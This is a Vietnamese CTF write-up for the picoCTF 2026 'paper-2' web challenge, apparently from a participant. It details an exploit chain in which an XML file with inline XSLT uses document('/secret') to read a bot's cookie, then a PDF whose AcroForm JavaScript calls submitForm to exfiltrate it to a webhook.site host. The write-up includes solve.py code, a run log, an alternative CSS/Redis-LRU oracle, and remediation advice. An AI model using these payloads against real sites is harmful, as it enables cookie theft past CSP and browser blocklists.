<img width="827" height="560" alt="image" src="https://github.com/user-attachments/assets/29e65ff8-7a5f-4264-a706-d9248efe1424" />

# PAPER-2: picoCTF 2026 (Web Exploitation, Hard): FULL WRITEUP

> **Flag:** `picoCTF{i_l1ke_frames_on_my_canvas_953d5fff}`

> **Tác giả challenge:** ehhthing

> **Vector:** XSLT `document()` (đọc same-origin không cần JS) + PDF AcroForm JavaScript `submitForm` (exfil vượt qua CSP + URLBlocklist)

> **Exploit:** `solve.py`

---

## MỤC LỤC

1. [Tổng quan thử thách](#1-tổng-quan-thử-thách)
2. [Phân tích source code từng dòng](#2-phân-tích-source-code)
3. [Mô hình tấn công: mục tiêu là gì, bị chặn ở đâu](#3-mô-hình-tấn-công)
4. [Tìm lỗ hổng: vì sao chọn XML/XSLT + PDF JS](#4-tìm-lỗ-hổng)
5. [Viết exploit TỪNG BƯỚC](#5-viết-exploit-từng-bước)
6. [Chạy thực tế trên server thật](#6-chạy-thực-tế)
7. [Sơ đồ flow tổng thể](#7-sơ-đồ-flow)
8. [Bảng: từng lớp phòng thủ bị vượt qua thế nào](#8-bảng-vượt-phòng-thủ)
9. [Solution thay thế (intended): CSS + Redis LRU](#9-solution-thay-thế)
10. [Cách vá lỗi (remediation)](#10-cách-vá-lỗi)

---

## 1. TỔNG QUAN THỬ THÁCH

```
paper-2
Web Exploitation: Hard: by ehhthing: picoCTF 2026

"A piece of paper is a blank canvas, what do you want on yours?"
Source code: paper-2.tar
Instance:    https://lonely-island.picoctf.net:<port>
```

**Luật chơi của hệ thống:**

- Bạn upload được **file tùy ý** (tối đa 64 KiB) lên "tờ giấy", và bot (headless Chrome) sẽ vào xem tờ giấy đó.
- Bot mang theo một **cookie tên `secret`** = 32 ký tự hex random.
- Endpoint `/flag?secret=<guess>` chỉ trả flag nếu `<guess>` **TRÙNG KHỚP 100%** với secret của bot.
- Mọi response đều có CSP chặn **toàn bộ JavaScript**, và browser của bot bị chính sách doanh nghiệp **chặn truy cập mọi website ngoài** trừ chính nó.

→ Nói ngắn: **"Hãy đánh cắp giá trị cookie trong trình duyệt không chạy được JS và không ra ra mạng được."**

---

## 2. PHÂN TÍCH SOURCE CODE

### 2.1: Hạ tầng (`Dockerfile`, `docker-compose.yml`)

```dockerfile
FROM --platform=amd64 oven/bun:1.3.7        # Server viết bằng Bun (TypeScript)
ADD https://dl.google.com/.../google-chrome-stable_current_amd64.deb   # Cài Chrome cho bot
CMD ["bun", "run", "index.ts"]
```

```yaml
services:
  redis:
    image: redis:7-alpine
    command: redis-server --maxmemory 512M --maxmemory-policy allkeys-lru ...
    # ↑ LƯU Ý: allkeys-lru: key này cho solution "intended", xem mục 9
  web:
    build: .
    ports: [ "8443:443" ]     # HTTPS với cert tự ký (mkcert)
```

Toàn bộ trạng thái nằm trong **Redis**: file upload, secret của bot, cờ `browser_open`.

### 2.2: Chrome Policy: "chuồng giam" của bot

```ts
await writeFile('/etc/opt/chrome/policies/managed/policy.json', JSON.stringify({
  'NetworkPredictionOptions': 2,          // tắt prefetch/DNS-prefetch (tiêu diệt side-channel prefetch)
  'CACertificates': [ ca.cert... ],       // tin tưởng CA tự sinh (mkcert) để vào https://web
  'URLBlocklist': ['*'],                  // CHẶN MỌI URL
  'URLAllowlist': [`https://${host}`],    // ...trừ https://web
}));
```

**Ý nghĩa:** mọi request ra ngoài (img, fetch, iframe, navigation tới attacker.com…) đều bị chặn ở mức chính sách trình duyệt. Exfil truyền thống "phone home" → **chết**.

### 2.3: Bot: sinh cookie secret & vòng đời phiên

```ts
const visit = async (url: string) => {
  await redis.set('browser_open', 'true');            // khóa: chỉ 1 bot tại một thời điểm
  const secret = randomBytes(16).toString('hex');     // ★ SECRET: 16 byte random = 32 ký tự hex
  browser = await puppeteer.launch({
    executablePath: '/usr/bin/google-chrome',
    args: [
      '--no-sandbox', '--disable-gpu',
      '--js-flags=--noexpose_wasm,--jitless',         // hardening V8 (không wasm, không JIT) → chống n-day exploit Chrome
      '--host-rules="MAP paper.local 127.0.0.1"'
    ],
    headless: true, pipe: true, userDataDir            // profile tạm, xóa sạch sau dùng
  });
  await browser.setCookie({
    name: 'secret',
    value: secret,
    domain: 'web',
    sameSite: 'Strict'      // ★ cookie SameSite=Strict: chỉ gửi trong request same-site
    // KHÔNG có httpOnly: nhưng vô nghĩa vì không có JS để đọc document.cookie :)
  });
  const page = await browser.newPage();
  await redis.set('secret', secret, 'EX', 60);        // ★ đáp án nằm trong Redis, TTL 60 GIÂY
  await page.goto(url);                               // bot vào xem trang của ta
  await Bun.sleep(61000);                             // chờ 61s rồi dọn dẹp
  ...
  await redis.del('secret');
  await redis.del('browser_open');
}
```

**Điểm mấu chốt về secret:**
- Secret tồn tại **song song** ở 2 nơi: cookie trong browser bot **và** key `secret` trong Redis (TTL 60s).
- Muốn flag ⇒ phải đọc được **giá trị cookie trong browser**, rồi đưa đúng vào `/flag` trước khi hết 60s.

### 2.4: Route `/upload`: kiểm soát hoàn toàn Content-Type

```ts
'/upload': {
  POST: async (req) => {
    form = await req.formData();
    const file = form.get('file');
    if (!file || !(file instanceof File) || !file.size || file.size > 2 ** 16) reject;
    const id = await redis.incr('current-id');
    const data = JSON.stringify([file.type, (await file.bytes()).toBase64()]);
    await redis.set(`file|${id}`, data, 'EX', 10 * 60);   // sống 10 phút
    return Response.redirect(`/paper/${id}`);
  }
}
```

- Field multipart **phải tên `file`** và phải kèm `filename` (nếu không Bun trả string, fail check `instanceof File`).
- **`file.type` do ta hoàn toàn kiểm soát**: đây chính là "mồi nhử" của đề bài. Ghi nhớ điểm này.
- Giới hạn: 64 KiB (cả body request).

### 2.5: Route `/paper/:id`: phục vụ lại với MIME + CSP

```ts
'/paper/:id': async (req) => {
  const res = await redis.get(`file|${req.params.id}`);
  const [type, data] = JSON.parse(res);
  return new Response(Buffer.from(data, 'base64'), headers(type));
}

const headers = (type) => ({
  headers: {
    'Content-Type': type,                                   // ← TA ĐIỀU KHIỂN
    'Content-Security-Policy': "default-src 'self' 'unsafe-inline'; script-src 'none'",
    'X-Content-Type-Options': 'nosniff'
  }
});
```

**Phân tích CSP chi tiết:**

| Directive | Giá trị hiệu lực | Hệ quả |
|---|---|---|
| `script-src` | `'none'` | **Mọi JS chết**: `<script>`, inline handler, `javascript:`, SVG `<script>`, worker… |
| `default-src` | `'self' 'unsafe-inline'` | img/style/font/connect/**frame**/object chỉ load được **same-origin**; style inline OK |
| `frame-ancestors` | (không khai báo) | không ai embed được trang này từ ngoài: nhưng ta cũng chẳng cần |
| `form-action` | (fallback default-src? KHÔNG: form-action KHÔNG fallback) | form submit đi đâu cũng được, **nhưng** không JS thì không auto-submit |

- `nosniff` ⇒ browser **không đoán** MIME; stylesheet phải `text/css`, script phải kiểu JS… → chặn kỹ thuật nhúng HTML/CSS sai kiểu.
- CSP header này gắn trên **mọi** response (kể cả `/secret`) ⇒ iframe con cũng chết JS (srcdoc/about:blank kế thừa CSP của cha).

### 2.6: Route `/secret`: nơi secret lộ mặt trong DOM

```ts
'/secret': async (req) => {
  const secret = req.cookies.get('secret') || '0123456789abcdef'.repeat(2); // fallback nếu không có cookie
  const payload = new URL(req.url, 'http://127.0.0.1').searchParams.get('payload') || '';
  return new Response(
    `<body secret="${secret}">${secret}\n${payload}</body>`,
    headers('text/html')
  );
}
```

**Đây là "lỗ hổng" công khai của đề:**
1. Cookie `secret` được in ra **thuộc tính DOM**: `<body secret="GIÁ_TRỊ">`.
2. Tham số `payload` được **reflect nguyên xi (raw HTML injection)** vào body.

⇒ Ta có thể inject `<style>` CSS thuần vào trang đang chứa secret, dùng **CSS attribute selector** để "hỏi" từng bit của secret:

```css
body[secret^="a"] { background-image: url('/paper/<marker_a>'); }   /* nếu bắt đầu bằng 'a' thì tải marker */
```

**NHƯNG:** exfil kiểu này cần một kênh quan sát. Mọi request đều same-origin, không có endpoint nào "ghi nhận" được dữ liệu từ URL một cách nhìn thấy được với attacker (đây chính là chỗ phải dùng Redis LRU: xem mục 9). Khổ lắm. **Có đường tắt đẹp hơn không? Có.**

### 2.7: Route `/flag`: cửa một lần duy nhất

```ts
'/flag': async (req) => {
  const guess = new URL(req.url, 'http://127.0.0.1').searchParams.get('secret');
  const secret = await redis.getdel('secret');       // ★ GETDEL: lấy xóa luôn
  if (!secret) return new Response('nice try');      // đã bị tiêu rồi
  if (secret !== guess) return new Response('wrong');// đoán sai ⇒ key biến mất
  return new Response(Bun.env.FLAG || 'picoctf{flag}');
}
```

- **GETDEL** ⇒ mỗi phiên bot chỉ có **1 phát bắn**. Đoán sai là mất trắng phiên đó (phải đợi phiên mới).
- Brute force 2^128 → vô nghĩa tuyệt đối. **Bắt buộc phải leak đúng giá trị.**

### 2.8: Route `/visit/:id`: kích hoạt bot

```ts
'/visit/:id': async (req) => {
  if (await redis.get('browser_open')) return 'browser still open!'; // chống chạy nhiều bot
  const res = await redis.get(`file|${req.params.id}`);
  if (!res) return 'not found!';
  visit(`https://web/paper/${req.params.id}`);   // bot sẽ thẳng /paper/<id> của ta
  return 'visiting!';
}
```

---

## 3. MÔ HÌNH TẤN CÔNG

**Mục tiêu duy nhất:** lấy chuỗi 32-hex trong cookie `secret` của bot.

**Các hướng chết ngay từ đầu:**

| Hướng | Vì sao chết |
|---|---|
| XSS truyền thống | `script-src 'none'` trên mọi response, kể cả iframe/srcdoc |
| Đọc `document.cookie` | Cần JS → không có JS |
| Inject `<img src="http://attacker/?leak">` | `default-src 'self'` + `URLBlocklist *` |
| Meta refresh sang trang ngoài | `URLBlocklist` chặn navigation |
| Brute force `/flag` | GETDEL + không gian 16^32 |
| DNS/timing prefetch | `NetworkPredictionOptions: 2` |
| Set cookie giả để đè secret | Không có cách set cookie từ phía client (meta http-equiv=set-cookie đã bị Chrome bỏ) |

**Các "tài nguyên" ta có mà đề cố tình cấp:**

1. **Content-Type tùy ý** trên `/paper/:id` (+ `nosniff` làm nó có ý nghĩa thật sự).
2. **Raw HTML injection** tại `/secret?payload=` (nơi secret nằm trong DOM).
3. Một bot ghé thăm trang ta chọn.

**Insight quyết định:** CSP chỉ là luật của **HTML rendering pipeline**. Nhưng `/paper/:id` cho phép ta **khởi động các renderer KHÁC**: XML/XSLT processor và PDF viewer (PDFium): vốn có **engine xử lý riêng**, không nằm trong tầm kiểm soát của `script-src 'none'`:

- **XSLT** có hàm **`document(url)`**: tự fetch một URL **same-origin (kèm cookie!)** và truy vấn bằng XPath → biến thành "JS-less fetch + parse".
- **PDFium** có **AcroForm JavaScript** (bản JS nhúng của PDF): có `this.URL` (đọc URL hiện tại **kể cả fragment**) và **`submitForm()`** (gửi HTTP POST ra ngoài) → biến thành "JS-less exfil".

Ghép lại: **XML đọc secret bằng XSLT → nhét secret vào fragment của iframe PDF → PDF JS đọc this.URL → submitForm gửi đi.** Hai renderer "xấu số" nối nhau thành một chuỗi JS đầy đủ.

---

## 4. TÌM LỖ HỔNG: GIẢI THÍCH TỪNG KỸ THUẬT

### 4.1: XSLT inline stylesheet trong chính file XML

Một file XML như sau:

```xml
<!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #IMPLIED> ]>
<?xml-stylesheet type="text/xsl" href="#xsl"?>
<doc xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:stylesheet version="1.0" id="xsl">
    <xsl:template match="/">
      <html><body>
        <iframe src="/paper/1#{document('/secret')/body/@secret}" width="1" height="1"></iframe>
      </html></body>
    </xsl:template>
  </xsl:stylesheet>
</doc>
```

**Giải thích từng dòng:**

1. `<?xml-stylesheet type="text/xsl" href="#xsl"?>`: PI bảo Chrome: *"hãy transform tài liệu này bằng stylesheet nằm ngay bên trong nó"* (stylesheet reference bằng fragment `#xsl`).
2. Để tham chiếu nội bộ bằng `#xsl`, phần tử đích phải có **ID type** trong DTD. Mặc định, attribute `id` của `xsl:stylesheet` **không** được khai báo là kiểu ID ⇒ thêm `<!ATTLIST xsl:stylesheet id ID #IMPLIED>` vào internal DTD. **Không có dòng này, `href="#xsl"` không trỏ được tới gì cả và transform không xảy ra.**
3. `xmlns:xsl=...` khai báo trên root để phần tử stylesheet được nhận diện đúng namespace XSLT.
4. `<xsl:template match="/">`: template khớp gốc, xuất ra **literal result element** `<html>...` (Chrome render kết quả như trang HTML thật).
5. `{document('/secret')/body/@secret}`: **Attribute Value Template** của XSLT: nội dung trong `{}` được **đánh giá biểu thức XPath** rồi gán vào thuộc tính `src` của iframe.
   - **`document('/secret')`**: hàm XSLT fetch URL `/secret` (resolve relative theo base `https://web/paper/2` ⇒ `https://web/secret`). Request này do libxslt/Blink network stack thực hiện **same-origin, cùng site** ⇒ **SameSite=Strict cookie vẫn được đính kèm**!
   - Response `/secret` là `<body secret="xxxx">xxxx\n</body>`: parse như XML, XPath **`/body/@secret`** lấy đúng giá trị attribute.
   - Kết quả: iframe trỏ đến `/paper/1#<32-ký-tự-secret>`.
6. **Vì sao dùng fragment `#...`?** Fragment **không bao giờ được gửi lên server**: không lo bị log, không phá route `/paper/:id`. Nó chỉ sống ở phía client.

**Lưu ý then chốt:** XSLT transform **không phải "script"** theo nghĩa CSP: `script-src 'none'` không chặn được libxslt xử lý transformation. Đây là điểm mù của CSP.

### 4.2: PDF + AcroForm JavaScript (PDFium)

PDF ta upload (rút gọn, chú thích):

```
%PDF-1.7
1 0 obj << /Type /Catalog /Pages 2 0 R
           /OpenAction 3 0 R                    ← Khi mở PDF, CHẠY action object 3 (không cần user!)
           /AcroForm << /Fields [5 0 R] >> >>   ← Khai báo form có 1 field
endobj

3 0 obj << /S /JavaScript
           /JS (app.setTimeOut("this.getField('x').value='go';", 100);) >>
endobj                                            ← OpenAction: sau 100ms, GHI giá trị vào field 'x'
                                                     (hành vi ghi giá trị kích hoạt sự kiện keystroke của field)

4 0 obj << /Type /Page ... /Annots [5 0 R] ... >> endobj

5 0 obj << /Type /Annot /Subtype /Widget          ← Widget = field hiển thị trên trang
           /FT /Tx /T (x)                         ← Text field tên 'x'
           /AA << /K << /S /JavaScript
              /JS (this.submitForm('https://webhook.site/<token>?u='+encodeURIComponent(this.URL));) >>
           >> >>
endobj                                            ← /AA = Additional Actions; /K = Keystroke event:
                                                     mỗi khi field 'x' nhận gõ/gán giá trị ⇒ chạy JS này
```

**Giải thích cơ chế:**

1. **OpenAction** chạy tự động khi PDF mở: không cần click.
2. Nó hẹn giờ 100ms rồi gán `value` cho field `x`. Việc gán giá trị làm PDFium phát sinh **Keystroke (/K)** event trên widget.
3. Action của /K gọi **`this.submitForm(url)`**: API AcroForm JS của PDFium: POST toàn bộ form tới `url`.
4. **`this.URL`** = URL đầy đủ của tài liệu PDF hiện hành: **bao gồm cả fragment** `#<secret>` mà XSLT vừa nhét vào!
5. `encodeURIComponent` đảm bảo ký tự đặc biệt (`#`, `/`) sống sót qua query string.

**Vì sao PDF JS thoát được CSP & URLBlocklist?**

- CSP `script-src 'none'` quản lý **document HTML/XML**. PDF viewer là plugin riêng (PDFium) với engine JS riêng: header CSP của response PDF không áp dụng mô hình script-src lên AcroForm JS.
- `URLBlocklist` chặn navigation/subresource do browser điều phối; request `submitForm` đi theo đường network riêng của PDFium: **thực nghiệm cho thấy nó lọt qua** (và đúng như vậy khi chạy thật).

→ Chuỗi hoàn chỉnh: **XML(XSLT đọc cookie) → iframe PDF kèm fragment → PDF JS đọc URL → POST ra webhook.**

---

## 5. VIẾT EXPLOIT TỪNG BƯỚC

Script hoàn chỉnh: `solve.py` (Python thuần, không thư viện ngoài).

### Bước 0: Hàm tiện ích HTTP (self-signed cert + chặn redirect)

```python
context = ssl._create_unverified_context()   # server dùng cert mkcert tự ký → bỏ qua verify

class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None   # KHÔNG tự follow 302
    # /upload trả 302 Location: /paper/<id>: mình muốn ĐỌC header Location để lấy id,
    # chứ không phải follow (follow cũng được nhưng parse Location sạch hơn).
```

### Bước 1: Upload file (mô phỏng form HTML)

```python
def upload_file(base_url, filename, content_type, data):
    boundary = "----paper2-" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'   # ← name PHẢI là 'file'
        f"Content-Type: {content_type}\r\n"                                          # ← TYPE do ta chọn
        "\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()

    status, headers, _, _ = http_request(base_url + "/upload", method="POST", data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        opener=build_opener(NoRedirectHandler))
    # headers["Location"] == "/paper/<id>"
    return re.search(r"/paper/(\d+)", headers["Location"]).group(1)
```

Điểm bắt buộc:
- `name="file"` + có `filename` ⇒ Bun tạo đối tượng `File` (qua check `instanceof File`).
- `Content-Type` của part chính là **`file.type`** được lưu: stage 1 là `application/xml`, stage 2 là `application/pdf`.

### Bước 2: Stage 2: dựng file PDF (upload TRƯỚC để biết id)

```python
def pdf_escape_literal(text):
    # chuỗi JS nằm trong literal ( ) của PDF → escape \ ( )
    return text.replace("\\","\\\\").replace("(","\\(").replace(")","\\)") ...

def build_pdf(callback_url):
    open_js   = "app.setTimeOut(\"this.getField('x').value='go';\", 100);"
    submit_js = f"this.submitForm('{callback_url}?u='+encodeURIComponent(this.URL));"
    return (f"""%PDF-1.7
1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R /AcroForm << /Fields [5 0 R] >> >> endobj
2 0 obj << /Type /Pages /Kids [4 0 R] /Count 1 >> endobj
3 0 obj << /S /JavaScript /JS ({pdf_escape_literal(open_js)}) >> endobj
4 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 300 300] /Annots [5 0 R] /Contents 6 0 R >> endobj
5 0 obj << /Type /Annot /Subtype /Widget /FT /Tx /T (x) /Rect [20 20 120 40]
           /AA << /K << /S /JavaScript /JS ({pdf_escape_literal(submit_js)}) >> >> >> endobj
6 0 obj << /Length 35 >> stream BT /F1 12 Tf 20 200 Td (hello) Tj ET endstream endobj
trailer << /Root 1 0 R >>
%%EOF""").encode()
```

### Bước 3: Stage 1: XML + XSLT (nhét `pdf_id` vừa lấy vào iframe)

```python
def build_stage1_xml(pdf_id):
    return f"""<!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #IMPLIED> ]>
<?xml-stylesheet type="text/xsl" href="#xsl"?>
<doc xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:stylesheet version="1.0" id="xsl">
    <xsl:template match="/">
      <html><body>
        <iframe src="/paper/{pdf_id}#{{document('/secret')/body/@secret}}"
                width="1" height="1" style="border:0"></iframe>
      </body></html>
    </xsl:template>
  </xsl:stylesheet>
</doc>""".encode()
```

### Bước 4: Tạo "điểm hứng" trên webhook.site

```python
POST https://webhook.site/token            → {"uuid": "<token>"}
callback_url = f"https://webhook.site/{token}"
```

(webhook.site miễn phí, log mọi request kèm query: hoàn hảo để hứng exfil.)

### Bước 5: Bắn bot & hứng secret

```python
trigger_visit(base_url, stage1_id)             # GET /visit/2 → "visiting!"
# Bot: sinh secret mới → SET redis EX 60 → goto /paper/2 (XML)
#   → XSLT render iframe /paper/1#SECRET → PDF mở → OpenAction → /K → submitForm
poll_webhook_for_secret(token, timeout=90):
    # GET https://webhook.site/token/<token>/requests?sorting=newest&per_page=100 mỗi giây
    # với mỗi request mới: lấy query param u, urlparse(...).fragment
    # nếu khớp regex ^[0-9a-f]{32}$ → đó là secret
redeem_flag(base_url, secret):                 # GET /flag?secret=<32hex> → FLAG
```

⚠️ **Nhịp thời gian:** secret trong Redis chỉ sống **60s** kể từ khi bot start ⇒ poll phải nhanh, redeem phải xảy ra trong cửa sổ đó. Thực tế callback về sau vài giây là đủ dư.

---

## 6. CHẠY THỰC TẾ

```console
$ curl -sk https://lonely-island.picoctf.net:52959/     # kiểm tra instance còn sống
<form action="/upload" method="POST" ...>

$ python solve.py https://lonely-island.picoctf.net:52959 --timeout 100
[+] webhook token: 6f34f4d0-6e66-4b81-862b-fe2e1eb6f89b
[+] callback URL: https://webhook.site/6f34f4d0-6e66-4b81-862b-fe2e1eb6f89b
[+] uploaded stage 2 PDF as /paper/1
[+] uploaded stage 1 XML as /paper/2
[+] bot triggered
[+] leaked URL: https://web/paper/1#8513b60945679a96116460289a26ef63
[+] secret: 8513b60945679a96116460289a26ef63
[+] flag: picoCTF{i_l1ke_frames_on_my_canvas_953d5fff}
```

**Một phát ăn ngay.** 🎯

Tên flag `i_l1ke_frames_on_my_canvas`: "frames" chính là iframe trong chain, "canvas" là tờ giấy của đề.

---

## 7. SƠ ĐỒ FLOW

```
ATTACKER                        SERVER (web+redis)                       BOT (headless Chrome)
   │                                     │                                        │
   │ POST /upload (PDF, application/pdf) │                                        │
   ├────────────────────────────────────►│  redis: file|1 = [pdf/js exfil]        │
   │◄─── 302 /paper/1 ───────────────────┤                                        │
   │                                     │                                        │
   │ POST /upload (XML, application/xml) │                                        │
   ├────────────────────────────────────►│  redis: file|2 = [xml+xslt]            │
   │◄─── 302 /paper/2 ───────────────────┤                                        │
   │                                     │                                        │
   │ GET /visit/2                        │                                        │
   ├────────────────────────────────────►│  browser_open=true                     │
   │                                     │  secret=RND(32hex), EX 60              │
   │◄─── "visiting!" ────────────────────┼────────────► goto https://web/paper/2  │
   │                                     │                                        │
   │                                     │            XML parse ──► XSLT transform│
   │                                     │            document('/secret') ◄──────┼── GET /secret
   │                                     │            (kèm COOKIE secret, Strict)│   (200: <body secret="RND">)
   │                                     │            XPath /body/@secret = RND  │
   │                                     │            iframe src=/paper/1#RND ───┼──► PDF viewer mở
   │                                     │                                       │    OpenAction(+100ms)
   │                                     │                                       │    set field 'x' ⇒ /K event
   │                                     │                                       │    submitForm(webhook?u=this.URL)
   │◄────────────────── webhook.site nhận: u=https://web/paper/1#RND ────────────┘
   │
   │ GET /flag?secret=RND   (trong 60s!)
   ├────────────────────────────────────►│  getdel secret == RND ✔
   │◄── picoCTF{i_l1ke_frames_on_my_canvas_953d5fff} ──┤
```

---

## 8. BẢNG VƯỢT PHÒNG THỦ

| Lớp phòng thủ của đề | Nhằm chặn gì | Bị vượt bằng |
|---|---|---|
| `script-src 'none'` | Mọi JavaScript trong HTML/XML | AcroForm JS của PDFium: engine ngoài phạm vi CSP |
| `default-src 'self'` | Subresource/network ra ngoài | XSLT `document()` fetch **same-origin** (hợp lệ theo CSP) |
| `URLBlocklist ['*']` | Navigation/request ra ngoài | `submitForm()` của PDFium đi đường riêng, lọt qua policy |
| SameSite=Strict cookie | Cookie rò rỉ cross-site | XSLT fetch từ chính origin web ⇒ vẫn đính cookie |
| httpOnly (không set) |: | thừa, vì không có JS thường; ta đọc qua **DOM attribute** tại `/secret` |
| GETDEL one-shot | brute-force | leak chính xác 100% trước khi bắn 1 phát duy nhất |
| `nosniff` | MIME confusion | ta **cung cấp đúng** MIME: `application/xml`, `application/pdf` |
| jitless/no-wasm | exploit V8 n-day | không cần: chỉ dùng tính năng "hợp pháp" của renderer |

---

## 9. SOLUTION THAY THẾ (INTENDED-STYLE): CSS ORACLE + REDIS LRU

Nếu muốn exfil **hoàn toàn same-origin** (không phụ thuộc webhook/PDF), cộng đồng còn giải sau:

1. **Inject CSS vào `/secret`** qua `?payload=<style>@import url(/paper/CSS)</style>`: nhờ `nosniff`, file CSS phải upload với type `text/css` (← lý do đề cho kiểm soát Content-Type).
2. CSS dùng attribute selector rà secret:
   - `body[secret*="xyz"] #slot{n}{background-image:url(/paper/MARKER_xyz)}`
   - `body[secret^="ab"] …`, `body[secret$="cd"] …`
   Chỉ khi token khớp, marker file mới được browser fetch.
3. **Kênh quan sát = Redis `allkeys-lru` 512MB:** upload ~6.800 file padding ~64KB (>400MB) để ép eviction. File nào **vừa được bot fetch** thì recency được refresh → **sống sót**; phần còn lại bị đuổi. Attacker GET lại từng marker: cái nào còn sống = token đó có trong secret.
4. Dựng lại chuỗi 32-hex từ các triplet/prefix/suffix sống sót (DP + giai đoạn exact-match nếu còn mơ hồ).

Chậm, ồn ào, tốn hàng nghìn request: nhưng chứng minh được bài này giải được **không cần một byte nào rời khỏi origin**. Flag `frames_on_my_canvas` nghiêng về chuỗi iframe nên khả năng cao chain XSLT/PDF mới là path "đẹp" mà tác giả cài cắm.

---

## 10. CÁCH VÁ LỖI

1. **Tách origin lưu trữ nội dung user** (sandbox domain, không chia cookie): triệt tiêu mọi same-origin read như `document('/secret')`.
2. **Whitelist MIME an toàn** cho `/paper/:id` (chỉ image/text), ép `Content-Disposition: attachment` với loại còn lại → vô hiệu hóa XML-XSLT và PDF viewer.
3. **Tắt JS trong PDF viewer** (policy `DisableJavaScriptInPDF` / flag tương ứng) hoặc tự host preview không dùng PDFium JS.
4. Thêm CSP: `object-src 'none'; frame-src 'none'` (hoặc bỏ hẳn `unsafe-inline`), cân nhắc header chặn XSLT bằng cách không serve XML dạng document.
5. `/flag` không nên GETDEL một phát chết: cho phép thử nhiều lần có rate-limit, secret TTL ngắn hơn thời gian bot sống.
6. Bot cookie: thêm `httpOnly` + xoá route `/secret` hoặc encode giá trị (HTML-escape) để không reflect raw.

---

## PHỤ LỤC: FILE THEO TAY

- `paper-2 (1)/index.ts`: source gốc
- `paper-2 (1)/solve.py`: exploit tự động hóa toàn bộ chain
- Chạy lại bất cứ lúc nào với instance mới:

```bash
python solve.py https://lonely-island.picoctf.net:<PORT> --timeout 100
```
